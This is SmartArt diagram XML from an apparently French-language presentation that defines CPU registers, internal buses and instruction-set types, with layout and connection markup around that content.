    <dgm:cxn modelId="{475449A9-1A4E-9D41-A5C9-DD94ABDC122D}" type="presParOf" srcId="{741FB7A7-D9C0-3F4B-92DC-2FADB7F177E5}" destId="{805B37D1-1AFD-E643-BAD7-099A64F32602}" srcOrd="6" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{80115FE4-94DC-6445-AE96-1D2F3AA9ACC7}" type="presParOf" srcId="{741FB7A7-D9C0-3F4B-92DC-2FADB7F177E5}" destId="{AC6F7C15-3700-9849-B4BC-C366B2C20584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1F09949-F41C-4F7F-83C1-B5F01EEE0C8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37154F-A916-4654-B612-35D3A0B4AFC3}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Définition :</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t> Petites mémoires internes ultra-rapides.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7EABC1D5-0C19-4F07-9521-B297BC7542A8}" type="parTrans" cxnId="{5710C516-6264-4E71-B679-6EE2EA4BADC1}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{CCC9A0E8-3E93-441D-BD0B-855888A85584}" type="sibTrans" cxnId="{5710C516-6264-4E71-B679-6EE2EA4BADC1}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2ADD97E9-542E-4641-846E-C3442693DEBE}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Utilité :</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t> Stocker temporairement les données en cours de traitement.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{053E3554-D69C-48E3-8412-0D1F9582BDA6}" type="parTrans" cxnId="{A2922140-960C-4AC4-861C-617FFB9533EA}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{336E8A53-CD07-4D33-9E6E-DA9D2C078B08}" type="sibTrans" cxnId="{A2922140-960C-4AC4-861C-617FFB9533EA}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{A213B501-6ED6-4D35-9095-A8BFB637602D}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Exemple :</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t> Accumulateur, compteur de programme.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{56760DE1-2ED7-414B-B5E1-F7B34F27BDAF}" type="parTrans" cxnId="{3F4F09BF-E0DF-40A6-9571-8FE0D190CC35}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2E8ED173-DBE5-4169-B659-F2AC48A559F8}" type="sibTrans" cxnId="{3F4F09BF-E0DF-40A6-9571-8FE0D190CC35}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{3FC2E2B4-9F19-5746-9979-DA3DC9C2C4C6}" type="pres">
      <dgm:prSet presAssocID="{71F09949-F41C-4F7F-83C1-B5F01EEE0C8A}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{8C91A69D-C463-6D48-82CC-5DFB3546D016}" type="pres">
      <dgm:prSet presAssocID="{2237154F-A916-4654-B612-35D3A0B4AFC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64C59AF-8204-B449-95E1-B5D76FF65F29}" type="pres">
      <dgm:prSet presAssocID="{CCC9A0E8-3E93-441D-BD0B-855888A85584}" presName="spacer" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{7E6CE80F-AEC8-5649-9EE6-C616649559EA}" type="pres">
      <dgm:prSet presAssocID="{2ADD97E9-542E-4641-846E-C3442693DEB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9D8D3B5-58E6-154B-994E-9916E4E190A8}" type="pres">
      <dgm:prSet presAssocID="{336E8A53-CD07-4D33-9E6E-DA9D2C078B08}" presName="spacer" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{E964B906-9E6B-054E-B44C-18795EAD45D5}" type="pres">
      <dgm:prSet presAssocID="{A213B501-6ED6-4D35-9095-A8BFB637602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710C516-6264-4E71-B679-6EE2EA4BADC1}" srcId="{71F09949-F41C-4F7F-83C1-B5F01EEE0C8A}" destId="{2237154F-A916-4654-B612-35D3A0B4AFC3}" srcOrd="0" destOrd="0" parTransId="{7EABC1D5-0C19-4F07-9521-B297BC7542A8}" sibTransId="{CCC9A0E8-3E93-441D-BD0B-855888A85584}"/>
    <dgm:cxn modelId="{A2922140-960C-4AC4-861C-617FFB9533EA}" srcId="{71F09949-F41C-4F7F-83C1-B5F01EEE0C8A}" destId="{2ADD97E9-542E-4641-846E-C3442693DEBE}" srcOrd="1" destOrd="0" parTransId="{053E3554-D69C-48E3-8412-0D1F9582BDA6}" sibTransId="{336E8A53-CD07-4D33-9E6E-DA9D2C078B08}"/>
    <dgm:cxn modelId="{7B490294-E8BC-CF42-B8B6-91C97954AD3C}" type="presOf" srcId="{2237154F-A916-4654-B612-35D3A0B4AFC3}" destId="{8C91A69D-C463-6D48-82CC-5DFB3546D016}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{3F4F09BF-E0DF-40A6-9571-8FE0D190CC35}" srcId="{71F09949-F41C-4F7F-83C1-B5F01EEE0C8A}" destId="{A213B501-6ED6-4D35-9095-A8BFB637602D}" srcOrd="2" destOrd="0" parTransId="{56760DE1-2ED7-414B-B5E1-F7B34F27BDAF}" sibTransId="{2E8ED173-DBE5-4169-B659-F2AC48A559F8}"/>
    <dgm:cxn modelId="{7C1CB8E0-1D55-354D-BD26-EA0FA2799BDD}" type="presOf" srcId="{71F09949-F41C-4F7F-83C1-B5F01EEE0C8A}" destId="{3FC2E2B4-9F19-5746-9979-DA3DC9C2C4C6}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{C01FC7F0-52C0-7243-B40C-D3925FE15787}" type="presOf" srcId="{A213B501-6ED6-4D35-9095-A8BFB637602D}" destId="{E964B906-9E6B-054E-B44C-18795EAD45D5}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{442300FD-2170-8B43-B7E7-0B760336D7C8}" type="presOf" srcId="{2ADD97E9-542E-4641-846E-C3442693DEBE}" destId="{7E6CE80F-AEC8-5649-9EE6-C616649559EA}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{5C446254-70BA-6245-B1C4-7804D94B2F56}" type="presParOf" srcId="{3FC2E2B4-9F19-5746-9979-DA3DC9C2C4C6}" destId="{8C91A69D-C463-6D48-82CC-5DFB3546D016}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{D32FEE0C-826E-6040-967C-730B4AD12E0C}" type="presParOf" srcId="{3FC2E2B4-9F19-5746-9979-DA3DC9C2C4C6}" destId="{464C59AF-8204-B449-95E1-B5D76FF65F29}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{752D3D40-D933-814C-9B94-13F081494F7A}" type="presParOf" srcId="{3FC2E2B4-9F19-5746-9979-DA3DC9C2C4C6}" destId="{7E6CE80F-AEC8-5649-9EE6-C616649559EA}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{E05967A1-6C07-904B-813B-C9F5AD0296AC}" type="presParOf" srcId="{3FC2E2B4-9F19-5746-9979-DA3DC9C2C4C6}" destId="{99D8D3B5-58E6-154B-994E-9916E4E190A8}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{C8D7BF7B-54B1-F046-9107-6E5A57F1CE64}" type="presParOf" srcId="{3FC2E2B4-9F19-5746-9979-DA3DC9C2C4C6}" destId="{E964B906-9E6B-054E-B44C-18795EAD45D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C1E15FA-4B7F-4666-9906-4C21698E87F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16EF33F-FF4F-4073-9D3C-C58E57371E7B}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Définition :</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t> Réseaux de communication internes au processeur.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{8586D425-5C7B-4DD0-B7C6-ED092C21562C}" type="parTrans" cxnId="{6BD797F5-5BD7-4DC2-AAD2-1D4D0A1BD398}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7CE98F0F-F063-48C6-94C1-414E55672080}" type="sibTrans" cxnId="{6BD797F5-5BD7-4DC2-AAD2-1D4D0A1BD398}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5B909076-7A98-4B13-A561-D407BCB0147B}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Rôle :</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t> Transporter les données, instructions et adresses entre les composants.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{27B3F0D6-E457-4DD1-B685-7D7AE72CD6B6}" type="parTrans" cxnId="{73654A2D-936B-43BB-94A5-08B432F4FC37}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{71FA71A0-FB2B-4ABB-93DB-1B7AAA8F6A10}" type="sibTrans" cxnId="{73654A2D-936B-43BB-94A5-08B432F4FC37}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{700E2FAC-AA95-4EA2-BFE3-B51369094998}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Types :</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t> Bus de données, bus d'adresses, bus de contrôle.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{F35E0AE3-8012-4D50-AEFD-8867180AD42E}" type="parTrans" cxnId="{7F6A967C-C484-4322-825B-0D80365E1AE2}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B10876D3-A769-4988-B18E-9859DAA187EE}" type="sibTrans" cxnId="{7F6A967C-C484-4322-825B-0D80365E1AE2}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{4792D84C-5CD2-3B44-9A5D-F674A3B28AE7}" type="pres">
      <dgm:prSet presAssocID="{BC1E15FA-4B7F-4666-9906-4C21698E87F5}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{9C2DF1AA-A29C-0D43-937E-C6CFC25F4433}" type="pres">
      <dgm:prSet presAssocID="{916EF33F-FF4F-4073-9D3C-C58E57371E7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8AC58EA-43AE-3341-98CB-E6BF90EF7F1F}" type="pres">
      <dgm:prSet presAssocID="{7CE98F0F-F063-48C6-94C1-414E55672080}" presName="spacer" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{DAE47874-F6D2-A94E-B70B-92660B570FB9}" type="pres">
      <dgm:prSet presAssocID="{5B909076-7A98-4B13-A561-D407BCB0147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E5F9DE2-0DC4-2C42-8240-13DB6F01D244}" type="pres">
      <dgm:prSet presAssocID="{71FA71A0-FB2B-4ABB-93DB-1B7AAA8F6A10}" presName="spacer" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{5A5E5B4F-6E04-9948-93B9-A4A33BD505FD}" type="pres">
      <dgm:prSet presAssocID="{700E2FAC-AA95-4EA2-BFE3-B5136909499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D22EC2C-F8D8-F043-826E-9EE076B81A02}" type="presOf" srcId="{BC1E15FA-4B7F-4666-9906-4C21698E87F5}" destId="{4792D84C-5CD2-3B44-9A5D-F674A3B28AE7}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{73654A2D-936B-43BB-94A5-08B432F4FC37}" srcId="{BC1E15FA-4B7F-4666-9906-4C21698E87F5}" destId="{5B909076-7A98-4B13-A561-D407BCB0147B}" srcOrd="1" destOrd="0" parTransId="{27B3F0D6-E457-4DD1-B685-7D7AE72CD6B6}" sibTransId="{71FA71A0-FB2B-4ABB-93DB-1B7AAA8F6A10}"/>
    <dgm:cxn modelId="{07305958-7D23-EE4A-BBEF-4EC21D8EC1A8}" type="presOf" srcId="{700E2FAC-AA95-4EA2-BFE3-B51369094998}" destId="{5A5E5B4F-6E04-9948-93B9-A4A33BD505FD}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{3EAD085E-0E8B-D847-935C-C19E997DE239}" type="presOf" srcId="{5B909076-7A98-4B13-A561-D407BCB0147B}" destId="{DAE47874-F6D2-A94E-B70B-92660B570FB9}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{7F6A967C-C484-4322-825B-0D80365E1AE2}" srcId="{BC1E15FA-4B7F-4666-9906-4C21698E87F5}" destId="{700E2FAC-AA95-4EA2-BFE3-B51369094998}" srcOrd="2" destOrd="0" parTransId="{F35E0AE3-8012-4D50-AEFD-8867180AD42E}" sibTransId="{B10876D3-A769-4988-B18E-9859DAA187EE}"/>
    <dgm:cxn modelId="{CCAADD85-66AA-174F-AED5-12C5427CC48B}" type="presOf" srcId="{916EF33F-FF4F-4073-9D3C-C58E57371E7B}" destId="{9C2DF1AA-A29C-0D43-937E-C6CFC25F4433}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{6BD797F5-5BD7-4DC2-AAD2-1D4D0A1BD398}" srcId="{BC1E15FA-4B7F-4666-9906-4C21698E87F5}" destId="{916EF33F-FF4F-4073-9D3C-C58E57371E7B}" srcOrd="0" destOrd="0" parTransId="{8586D425-5C7B-4DD0-B7C6-ED092C21562C}" sibTransId="{7CE98F0F-F063-48C6-94C1-414E55672080}"/>
    <dgm:cxn modelId="{12EE7013-B60E-3947-892E-5496DE1E5167}" type="presParOf" srcId="{4792D84C-5CD2-3B44-9A5D-F674A3B28AE7}" destId="{9C2DF1AA-A29C-0D43-937E-C6CFC25F4433}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{5CCA88FC-24CF-C249-B63C-DBC03F5BC396}" type="presParOf" srcId="{4792D84C-5CD2-3B44-9A5D-F674A3B28AE7}" destId="{48AC58EA-43AE-3341-98CB-E6BF90EF7F1F}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{2754C61D-6E5D-284A-B13B-78A8B574B736}" type="presParOf" srcId="{4792D84C-5CD2-3B44-9A5D-F674A3B28AE7}" destId="{DAE47874-F6D2-A94E-B70B-92660B570FB9}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{4B556FCF-6818-2E48-8B14-2555572B68CA}" type="presParOf" srcId="{4792D84C-5CD2-3B44-9A5D-F674A3B28AE7}" destId="{9E5F9DE2-0DC4-2C42-8240-13DB6F01D244}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{614BC237-6DDC-4C42-B227-A58A3CBCA983}" type="presParOf" srcId="{4792D84C-5CD2-3B44-9A5D-F674A3B28AE7}" destId="{5A5E5B4F-6E04-9948-93B9-A4A33BD505F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166FACF-EB22-4803-87F9-DFE690719DD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E159783-170D-4F6B-984A-1B1C49C5565B}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Définition :</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t> Ensemble d'ordres que la CPU peut exécuter.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{3C169DBC-ED9A-40CC-9589-303523D28952}" type="parTrans" cxnId="{D34DEF10-068A-4B0D-A15F-7BEA5FCB46C8}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{90E620EF-3EAB-4D25-9D85-7B20D5379251}" type="sibTrans" cxnId="{D34DEF10-068A-4B0D-A15F-7BEA5FCB46C8}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{FD9BC6B7-45DB-4A28-A6B4-692A66B23240}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Types courants :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{51A8538A-E5FA-4ED4-88AC-695C5BEEB7A3}" type="parTrans" cxnId="{14984662-F321-412F-A4FB-B3D8B60E5F8A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E7AAFD09-171C-40F9-B94F-A2C0564FC297}" type="sibTrans" cxnId="{14984662-F321-412F-A4FB-B3D8B60E5F8A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{A59C2622-F8F5-4291-99A8-E7C2938106E1}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Arithmétiques :</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t> Addition, soustraction.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{920A822B-C165-4604-AE12-154A88C09238}" type="parTrans" cxnId="{C7CDD9B6-0817-4A43-8F31-5DCF22312065}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{F743A741-586D-4658-963D-EA39444B867F}" type="sibTrans" cxnId="{C7CDD9B6-0817-4A43-8F31-5DCF22312065}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{D615A6B7-CC49-4294-8B59-7B6E3ABB83F3}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Logiques :</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t> AND, OR, NOT.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{29DCA2B1-AB40-477C-A465-FE492D01F49A}" type="parTrans" cxnId="{B4B18EFB-E8DF-417C-9D17-E3DE4BB82642}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2789A729-71AC-42F5-9BE2-05A10044DCF2}" type="sibTrans" cxnId="{B4B18EFB-E8DF-417C-9D17-E3DE4BB82642}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{88399255-33B6-4D2F-9111-54ABAD016EAC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Contrôle :</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t> Sauts, conditions (ex. IF, GOTO).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7636C3A2-DF50-4816-9495-F8358AACE911}" type="parTrans" cxnId="{5DADDAA2-9189-478C-9D88-195DB63B6706}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2C2FCAD8-2F6A-4C14-B342-6F0785B9CBD6}" type="sibTrans" cxnId="{5DADDAA2-9189-478C-9D88-195DB63B6706}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{833752DC-3652-D349-AEAB-5CE7B2423CA0}" type="pres">
      <dgm:prSet presAssocID="{7166FACF-EB22-4803-87F9-DFE690719DDA}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{43C88655-9832-BE40-B801-D94396CA2874}" type="pres">
      <dgm:prSet presAssocID="{DE159783-170D-4F6B-984A-1B1C49C5565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998A44-2F22-AD4E-B63A-B3C2B68E3826}" type="pres">
      <dgm:prSet presAssocID="{90E620EF-3EAB-4D25-9D85-7B20D5379251}" presName="spacer" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{42FD6002-3EB8-7943-87BA-56A684EC588C}" type="pres">
      <dgm:prSet presAssocID="{FD9BC6B7-45DB-4A28-A6B4-692A66B2324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B354C2D-9F31-324E-93F6-BF91C404A744}" type="pres">
      <dgm:prSet presAssocID="{FD9BC6B7-45DB-4A28-A6B4-692A66B2324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9133809-2CBC-3F40-BAEA-16ADF9D83C84}" type="presOf" srcId="{A59C2622-F8F5-4291-99A8-E7C2938106E1}" destId="{2B354C2D-9F31-324E-93F6-BF91C404A744}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{D34DEF10-068A-4B0D-A15F-7BEA5FCB46C8}" srcId="{7166FACF-EB22-4803-87F9-DFE690719DDA}" destId="{DE159783-170D-4F6B-984A-1B1C49C5565B}" srcOrd="0" destOrd="0" parTransId="{3C169DBC-ED9A-40CC-9589-303523D28952}" sibTransId="{90E620EF-3EAB-4D25-9D85-7B20D5379251}"/>
    <dgm:cxn modelId="{432E0B34-0301-3A4D-B84D-7FB973ABF823}" type="presOf" srcId="{FD9BC6B7-45DB-4A28-A6B4-692A66B23240}" destId="{42FD6002-3EB8-7943-87BA-56A684EC588C}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{7BA1153A-FD43-504A-A85F-4A2E78B46A08}" type="presOf" srcId="{DE159783-170D-4F6B-984A-1B1C49C5565B}" destId="{43C88655-9832-BE40-B801-D94396CA2874}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{B721D945-C212-3444-81E6-DF024A22E38B}" type="presOf" srcId="{88399255-33B6-4D2F-9111-54ABAD016EAC}" destId="{2B354C2D-9F31-324E-93F6-BF91C404A744}" srcOrd="0" destOrd="2" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{14984662-F321-412F-A4FB-B3D8B60E5F8A}" srcId="{7166FACF-EB22-4803-87F9-DFE690719DDA}" destId="{FD9BC6B7-45DB-4A28-A6B4-692A66B23240}" srcOrd="1" destOrd="0" parTransId="{51A8538A-E5FA-4ED4-88AC-695C5BEEB7A3}" sibTransId="{E7AAFD09-171C-40F9-B94F-A2C0564FC297}"/>
    <dgm:cxn modelId="{8C19216B-1150-BB47-9CE1-9BADBB0BC3B9}" type="presOf" srcId="{7166FACF-EB22-4803-87F9-DFE690719DDA}" destId="{833752DC-3652-D349-AEAB-5CE7B2423CA0}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{5DADDAA2-9189-478C-9D88-195DB63B6706}" srcId="{FD9BC6B7-45DB-4A28-A6B4-692A66B23240}" destId="{88399255-33B6-4D2F-9111-54ABAD016EAC}" srcOrd="2" destOrd="0" parTransId="{7636C3A2-DF50-4816-9495-F8358AACE911}" sibTransId="{2C2FCAD8-2F6A-4C14-B342-6F0785B9CBD6}"/>
